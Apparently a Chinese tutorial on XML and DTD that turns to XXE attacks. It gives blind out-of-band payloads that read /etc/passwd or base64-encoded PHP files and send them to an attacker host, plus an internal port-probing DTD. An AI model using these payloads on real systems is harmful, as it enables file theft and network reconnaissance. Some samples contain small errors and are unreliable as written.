**1.xml**
xml主要用于存储和传输数据，主要有几个原因，
xml可以自定义标签，传输时可以直接了解标签的值和含义，且可适配复杂数据场景，而html不行
html的语法容错性强，可嵌套，大小写混合使用，会导致数据解析出错，而xml有严格的语法要求
html 的数据可能存在多个标签的使用， 如传输订单数据，有人用 `<table>` 嵌套，有人用 `<div>` 堆叠，接收难以确定格式，而xml要求且仅有一个根元素，然后基于根元素在添加层级
**2.DTD文件 **
文档类型定义，简单来说就是规则，定义了xml文件的规则，在xml文件里面可以在内部声明，也可以在外部引用
内部声明：

```python
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>
<note>
  <to>George</to>
  <from>John</from>
  <heading>Reminder</heading>
  <body>Don't forget the meeting!</body>
</note>

```
外部声明：

```python
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>

note.dtd
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>

```
**3.DTD实体**
 DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用  
内部声明：

```python
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
  <!ENTITY writer "Bill Gates">
  <其他实体>
]>
<root>&xxe;</root>

```
外部利用 这里主要讲无回显的
这是读取文档文件
xml的引用
```python
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
]>
<author>&writer;&copyright;</author>

```
恶意DTD文件
```python
无回显的
<!-- 步骤1：定义内部实体，读取目标文件（/etc/passwd 可替换为其他敏感文件） -->
<!ENTITY % file SYSTEM "file:///etc/passwd">

<!-- 步骤2：定义实体，将读取的文件内容通过 HTTP 发送到攻击者服务器（替换为你的服务器 IP/端口） -->
<!ENTITY % exfiltrate "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.100:8080/log?content=%file;'>">

<!-- 步骤3：执行上述实体，触发数据外带 -->
%exfiltrate;
%send;

```

```python
攻击者开启监听
python3 -m http.server 8080  # 启动 8080 端口的 HTTP 服务器，日志会显示请求内容

目标xml解析实体时调用恶意DTD文件
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://192.168.1.100:8080/evil.dtd">  <!-- 引用攻击者的恶意 DTD -->
<root></root>

```
读取php文件或者编码文件等

```python
<!-- 用 base64 编码读取 /etc/passwd，避免特殊字符报错 -->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">

<!-- 外带编码后的数据（攻击者接收后需 base64 解码） -->
<!ENTITY % exfiltrate "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.100:8080/log?b64_content=%file;'>">

%exfiltrate;
%send;

```
目标引用dtd文件
```python
<?xml version="1.0" encoding="utf-8"?>

<!DOCTPE  ANY[

<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=conf.php">]>

<name>&xxe;</name>

```
**4.DTD用于内网端口探测**
 通过尝试连接内网端口，利用响应延迟判断端口是否开放（如探测内网 80、3389 端口），用于内网信息收集。  

```python
<!-- 探测内网 192.168.1.1 的 80 端口（HTTP 服务），可替换为其他 IP/端口 -->
<!ENTITY % probe SYSTEM "http://192.168.1.1:80">

<!-- 若端口开放，会快速响应；若关闭，会超时，通过目标解析延迟判断端口状态 -->
<!ENTITY % exfiltrate "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.100:8080/port?80=open'>">

%exfiltrate;
%send;

```
